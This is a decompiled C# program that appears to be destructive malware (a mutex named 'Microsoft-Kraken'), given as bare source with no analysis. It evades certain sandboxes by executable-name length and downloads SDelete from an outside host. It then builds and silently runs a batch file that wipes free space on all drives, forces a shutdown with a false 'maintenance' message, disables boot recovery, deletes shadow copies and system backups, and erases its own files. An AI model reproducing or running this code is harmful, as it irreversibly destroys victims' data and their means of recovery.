using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ns1;
using ns3;
using ns4;

namespace Main;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		try
		{
			int processorCount = Environment.ProcessorCount;
			if (processorCount != -1 || processorCount != 0 || processorCount != 1)
			{
				using Process process = Process.GetCurrentProcess();
				switch (processorCount)
				{
				default:
					process.PriorityClass = ProcessPriorityClass.RealTime;
					break;
				case 3:
					process.PriorityClass = ProcessPriorityClass.High;
					break;
				case 2:
					process.PriorityClass = ProcessPriorityClass.AboveNormal;
					break;
				}
			}
		}
		catch (Exception)
		{
		}
		new Mutex(initiallyOwned: true, $"Microsoft-Kraken-{Environment.MachineName}", out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		bool flag = false;
		int[] array = new int[3] { 32, 48, 64 };
		foreach (int num in array)
		{
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == num - ".exe".Length)
			{
				flag = true;
			}
		}
		if (Class4.smethod_0() && !flag)
		{
			Miscellaneous.smethod_5("Begin");
			Thread thread = new Thread((ThreadStart)delegate
			{
				smethod_0();
			});
			thread.Start();
			thread.Join();
			Miscellaneous.smethod_5("End:" + Class11.long_0);
			smethod_1();
		}
		Miscellaneous.smethod_13(0);
	}

	private static void smethod_0()
	{
		Class12.smethod_0(Class6.Class7.smethod_2(), Class6.Class7.smethod_4());
		Class6.Class7.smethod_3(null);
		Class6.Class7.smethod_5(null);
	}

	private static void smethod_1()
	{
		try
		{
			string text = $"{Environment.SystemDirectory.Substring(0, 1)}:\\ProgramData\\";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			byte[] array;
			using (WebClient webClient = new WebClient())
			{
				array = webClient.DownloadData("https://download.sysinternals.com/files/SDelete.zip");
				if (array == null)
				{
					return;
				}
			}
			string text2 = Path.Combine(text, "Microsoft.zip");
			File.WriteAllBytes(text2, array);
			Class15 @class = new Class15(text2);
			@class.method_4(text);
			@class.System_002EIDisposable_002EDispose();
			File.Delete(text2);
			if (!File.Exists(Path.Combine(text, "sdelete.exe")) && !File.Exists(Path.Combine(text, "sdelete64.exe")))
			{
				return;
			}
			if (File.Exists(Path.Combine(text, "Eula.txt")))
			{
				File.Delete(Path.Combine(text, "Eula.txt"));
			}
			if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				if (File.Exists(Path.Combine(text, "sdelete.exe")))
				{
					File.Delete(Path.Combine(text, "sdelete.exe"));
				}
				File.Move(Path.Combine(text, "sdelete64.exe"), Path.Combine(text, "sdelete.exe"));
			}
			else if (File.Exists(Path.Combine(text, "sdelete64.exe")))
			{
				File.Delete(Path.Combine(text, "sdelete64.exe"));
			}
			string text3 = "release.bat";
			string text4 = $":: [Version {Class4.Class5.smethod_1()}]" + Environment.NewLine + Environment.NewLine + "REM [Echo OFF]" + Environment.NewLine + "@echo off" + Environment.NewLine + Environment.NewLine + "REM [Microsoft Sysinternals Eula Accepted]" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\"" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\" /v EulaAccepted /t REG_DWORD /d 1 /f" + Environment.NewLine + Environment.NewLine + "REM [Wipe Drives Free Space]" + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text5 in logicalDrives)
			{
				if ((new DriveInfo(text5).IsReady && new DriveInfo(text5).DriveType != DriveType.CDRom) || new DriveInfo(text5).DriveType != 0)
				{
					text4 = ((!(text5.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1))) ? (text4 + $"cmd.exe /c {text}sdelete.exe -z {text5.Substring(0, 1)}:{Environment.NewLine}") : (text4 + $"cmd.exe /c {text}sdelete.exe -c -z {text5.Substring(0, 1)}:{Environment.NewLine}"));
				}
			}
			text4 = text4 + Environment.NewLine + "REM [Start SYSTEM Shutdown Timer]" + Environment.NewLine + string.Format("shutdown /S /F /T {0} /C \"{1}\"", 300, "Unexpected shutdown due to maintenance break.") + Environment.NewLine + Environment.NewLine + "REM [Disable Safe Boot]" + Environment.NewLine + "bcdedit /set {default} recoveryenabled No" + Environment.NewLine + "bcdedit /set {default} bootstatuspolicy ignoreallfailures" + Environment.NewLine + Environment.NewLine + "REM [Delete Backups]" + Environment.NewLine + "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" + Environment.NewLine + "wmic SHADOWCOPY DELETE" + Environment.NewLine + "vssadmin delete shadows /All" + Environment.NewLine + Environment.NewLine + "REM [Delete Temp Files]" + Environment.NewLine + string.Format("del {0}", Path.Combine(text, "sdelete.exe")) + Environment.NewLine + $"del {Path.Combine(text, text3)}";
			File.WriteAllText(Path.Combine(text, text3), text4);
			Process obj = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = $"/C cd {text} && {text3}"
				}
			};
			new ProcessStartInfo(text + text3);
			obj.Start();
		}
		catch (Exception)
		{
		}
	}
}
